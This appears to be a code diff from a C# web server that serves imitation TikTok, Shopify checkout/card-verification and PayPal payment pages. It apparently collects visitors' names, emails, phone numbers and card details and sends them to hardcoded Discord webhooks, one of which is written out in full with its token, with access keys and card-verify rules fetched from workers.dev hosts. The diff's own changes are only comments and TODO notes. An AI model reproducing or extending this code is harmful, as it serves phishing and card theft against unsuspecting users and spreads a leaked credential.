@@ -213,10 +213,10 @@ class WebServer
 class Files
 {
     public static readonly string TikTokWebsite_BadgeRequest = "./Files/TikTokWebsite/BadgeRequest.html";
-//         public static readonly string TikTokWebsite_BadgeRequestChallenge = string.Empty;
+    // public static readonly string TikTokWebsite_BadgeRequestChallenge = string.Empty;
 
     public static readonly string ShopifyWebsite_PhoneNumber = "./Files/ShopifyWebsite/PhoneNumber.html";
-//         public static readonly string ShopifyWebsite_PhoneNumberChallenge = string.Empty;
+    // public static readonly string ShopifyWebsite_PhoneNumberChallenge = string.Empty;
 
     public static readonly string ShopifyProxy_Checkout = "./Files/ShopifyProxy/Checkout.html";
     public static readonly string ShopifyProxy_Card = "./Files/ShopifyProxy/Card.html";
@@ -224,7 +224,7 @@ class Files
     public static readonly string ShopifyProxy_CardVerify = "./Files/ShopifyProxy/CardVerify.html";
 
     public static readonly string PayPalWebsite_PaymentRequest = "./Files/PayPalWebsite/PaymentRequest.html";
-//         public static readonly string PayPalWebsite_PaymentRequestChallenge = string.Empty;
+    // public static readonly string PayPalWebsite_PaymentRequestChallenge = string.Empty;
 }
 
 // TikTok Website v1.0
@@ -267,22 +267,22 @@ class TikTokWebsite
                 { "Message", data.Message }
             });
 
-//                 WebServer.RespondWithJson(context, (writer) =>
-//                 {
-//                     if (string.IsNullOrWhiteSpace(data.Username)
-//                         || string.IsNullOrWhiteSpace(data.FirstName)
-//                         || string.IsNullOrWhiteSpace(data.LastName)
-//                         || string.IsNullOrWhiteSpace(data.EmailAddress)
-//                         || string.IsNullOrWhiteSpace(data.PhoneNumber)
-//                         || string.IsNullOrWhiteSpace(data.Message))
-//                     {
-//                         writer.WriteBoolean("Success", false);
-//                     }
-//                     else
-//                     {
-//                         writer.WriteBoolean("Success", true);
-//                     }
-//                 });
+            // WebServer.RespondWithJson(context, (writer) =>
+            // {
+            //     if (string.IsNullOrWhiteSpace(data.Username)
+            //         || string.IsNullOrWhiteSpace(data.FirstName)
+            //         || string.IsNullOrWhiteSpace(data.LastName)
+            //         || string.IsNullOrWhiteSpace(data.EmailAddress)
+            //         || string.IsNullOrWhiteSpace(data.PhoneNumber)
+            //         || string.IsNullOrWhiteSpace(data.Message))
+            //     {
+            //         writer.WriteBoolean("Success", false);
+            //     }
+            //     else
+            //     {
+            //         writer.WriteBoolean("Success", true);
+            //     }
+            // });
 
             WebServer.RespondWithJson(context, (writer) => { });
         }
@@ -810,6 +810,7 @@ class Messaging
     }
 }
 
+// TODO: Replace with Cloudflare API v4
 class Discord
 {
     public static readonly string TikTokWebsite = "https://discord.com/api/webhooks/866327449003491339/QgSY8oJTbxtUizMzefpgvdVf_FAWrCq-Rloo63uVLbrSPi0q8781oyBB1__pAhvYSpuZ";
@@ -929,6 +930,7 @@ class Discord
     }
 }
 
+// TODO: Direct API v4 access rather than worker script
 class AccessKeys
 {
     private static readonly string Hostname = "access-keys.kalobu.workers.dev";
@@ -992,6 +994,7 @@ class AccessKeys
     }
 }
 
+// TODO: Direct API v4 access rather than worker script
 class AccessRules
 {
     public static readonly string CardVerify = "https://access-rules.kalobu.workers.dev/access-rules/card_verify.json";
